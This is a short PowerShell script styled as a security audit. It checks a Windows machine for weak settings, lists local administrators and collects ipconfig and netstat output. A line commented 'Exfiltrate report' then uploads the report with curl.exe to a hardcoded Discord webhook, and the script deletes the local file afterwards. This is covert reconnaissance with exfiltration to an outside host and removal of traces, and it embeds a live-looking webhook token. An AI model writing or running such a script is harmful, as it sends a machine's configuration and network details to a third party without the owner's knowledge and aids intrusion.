$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
$reportPath = "$env:TEMP\SecurityAudit-$(Get-Date -f yyyyMMddHHmm).txt"

# Vulnerability checks
$checks = @{
    'UAC Status' = { (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').EnableLUA -ne 1 }
    'SMBv1 Enabled' = { Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol | Select -ExpandProperty State -eq 'Enabled' }
    'PowerShell v2' = { Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 | Select -ExpandProperty State -eq 'Enabled' }
    'Unquoted Service Paths' = { Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch '"' } }
    'Admin Users' = { net localgroup administrators }
}

# Run checks and build report
"=== Vulnerability Scan Report ===`n" | Out-File $reportPath
$checks.Keys | ForEach-Object {
    try {
        $result = & $checks[$_]
        "$_ : $(if($result) {'VULNERABLE'} else {'Secure'})" | Out-File $reportPath -Append
    }
    catch {
        "$_ : Check failed" | Out-File $reportPath -Append
    }
}

# Network information
"`n=== Network Configuration ===`n" | Out-File $reportPath -Append
ipconfig /all | Out-File $reportPath -Append
netstat -ano | Out-File $reportPath -Append

# Exfiltrate report
curl.exe -F "file1=@$reportPath" $hook

# Cleanup
Remove-Item $reportPath -Force
